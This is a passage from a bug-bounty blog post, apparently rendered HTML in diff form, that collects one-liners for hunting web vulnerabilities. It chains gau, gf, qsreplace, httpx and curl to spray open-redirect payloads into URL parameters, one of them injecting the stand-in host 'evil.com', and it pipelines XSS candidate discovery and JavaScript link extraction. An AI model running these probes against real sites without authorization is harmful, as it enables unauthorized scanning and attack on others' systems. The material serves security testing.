+<h3 id="Using-gau-and-gf"><a href="#Using-gau-and-gf" class="headerlink" title="Using gau and gf"></a>Using <code>gau</code> and <code>gf</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> target.com -all | gau | gf redirect | uro | <span class="keyword">while</span> <span class="built_in">read</span> url; <span class="keyword">do</span> <span class="built_in">cat</span> path/to/wordlist.txt | <span class="keyword">while</span> <span class="built_in">read</span> payload; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$url</span>&quot;</span> | qsreplace <span class="string">&quot;<span class="variable">$payload</span>&quot;</span>; <span class="keyword">done</span>; <span class="keyword">done</span> | httpx-toolkit -silent -fr -mr <span class="string">&quot;google.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Using-curl-to-detect-Open-Redirect"><a href="#Using-curl-to-detect-Open-Redirect" class="headerlink" title="Using curl to detect Open Redirect"></a>Using <code>curl</code> to detect Open Redirect</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> urls.txt | qsreplace <span class="string">&quot;https://evil.com&quot;</span> | xargs -I &#123;&#125; curl -s -o /dev/null -w <span class="string">&quot;%&#123;url_effective&#125; -&gt; %&#123;redirect_url&#125;\n&quot;</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="Finding-XSS-with-One-Liner"><a href="#Finding-XSS-with-One-Liner" class="headerlink" title="Finding XSS with One-Liner"></a>Finding XSS with One-Liner</h2><h3 id="Detect-URLs-with-parameters"><a href="#Detect-URLs-with-parameters" class="headerlink" title="Detect URLs with parameters"></a>Detect URLs with parameters</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> example.com | gau | gf xss | uro | Gxss | kxss | <span class="built_in">tee</span> xss_urls.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong> Cleaning the results</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> xss_urls.txt | grep -oP <span class="string">&#x27;^URL: \K\S+&#x27;</span> | sed <span class="string">&#x27;s/=.*/=/&#x27;</span> | <span class="built_in">sort</span> -u &gt; finalurls.txt</span><br></pre></td></tr></table></figure>
+<p><strong>|</strong> Run <a target="_blank" rel="noopener" href="https://github.com/coffinxp/loxs">open redirect tool</a> for automation:</p>
+<h3 id="Reading-js-file-to-find-RXSS-and-Open-Redirect-with-linkfinder"><a href="#Reading-js-file-to-find-RXSS-and-Open-Redirect-with-linkfinder" class="headerlink" title="Reading .js file to find RXSS and Open Redirect with linkfinder"></a>Reading <code>.js</code> file to find RXSS and Open Redirect with <code>linkfinder</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> js.txt | <span class="keyword">while</span> <span class="built_in">read</span> url; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;Processing URL: <span class="variable">$url</span>&quot;</span> &gt;&gt; link-output.txt</span><br><span class="line">  python ~/path/to/your/linkfinder.py -d -i <span class="variable">$url</span> -o cli &gt;&gt; link-output.txt</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═&quot;</span> &gt;&gt; link-output.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>There are many <code>payloads</code>, <code>tools</code>, and <code>one-liner</code> commands available on the internet, but I haven’t tried them all yet. In this post, I will continue to update it’ every time I discover new payloads, tools, or one-liners for detecting vulnerabilities.</p>
+<hr>
+<p>If you liked my article please leave a respect on my at HackTheBox <a target="_blank" rel="noopener" href="https://www.hackthebox.eu/profile/128965">Profile</a></p>
+<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-of-my-One-Liner-and-Automated-tools-collections"><span class="toc-number">1.</span> <span class="toc-text">Some of my One Liner and Automated tools collections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-find-LFI"><span class="toc-number">1.1.</span> <span class="toc-text">One Liner to find LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-find-SQLi-with-tools"><span class="toc-number">1.2.</span> <span class="toc-text">One Liner to find SQLi with tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-SQLMap-to-find-SQLi"><span class="toc-number">1.3.</span> <span class="toc-text">With SQLMap to find SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sample-SQLi-Payloads"><span class="toc-number">1.4.</span> <span class="toc-text">Sample SQLi Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header-Based-SQLi"><span class="toc-number">1.5.</span> <span class="toc-text">Header-Based SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-detect-SQLi-via-Headers"><span class="toc-number">1.6.</span> <span class="toc-text">One Liner to detect SQLi via Headers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-Liner-to-detect-Host-Header-Injection"><span class="toc-number">1.7.</span> <span class="toc-text">One Liner to detect Host Header Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Detect-Open-Redirect-vulnerabilities-with-one-liner"><span class="toc-number">1.8.</span> <span class="toc-text">Detect Open Redirect vulnerabilities with one-liner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Detecting-Open-Redirect-with-httpx-toolkit"><span class="toc-number">1.9.</span> <span class="toc-text">Detecting Open Redirect with httpx-toolkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-custom-list-of-Open-Redirects-Payloads"><span class="toc-number">1.10.</span> <span class="toc-text">With custom list of Open Redirects Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-gau-and-gf"><span class="toc-number">1.11.</span> <span class="toc-text">Using gau and gf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-curl-to-detect-Open-Redirect"><span class="toc-number">1.12.</span> <span class="toc-text">Using curl to detect Open Redirect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Finding-XSS-with-One-Liner"><span class="toc-number">2.</span> <span class="toc-text">Finding XSS with One-Liner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Detect-URLs-with-parameters"><span class="toc-number">2.1.</span> <span class="toc-text">Detect URLs with parameters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-js-file-to-find-RXSS-and-Open-Redirect-with-linkfinder"><span class="toc-number">2.2.</span> <span class="toc-text">Reading .js file to find RXSS and Open Redirect with linkfinder</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&text=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&is_video=false&description=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=One Liner and Automated Tools For Hunting Collections&body=Check out this article: https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&title=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&name=One Liner and Automated Tools For Hunting Collections&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2025-04-17/tools/automation/collections-for-hunting/&t=One Liner and Automated Tools For Hunting Collections"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Information Security &#64; Medz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
+
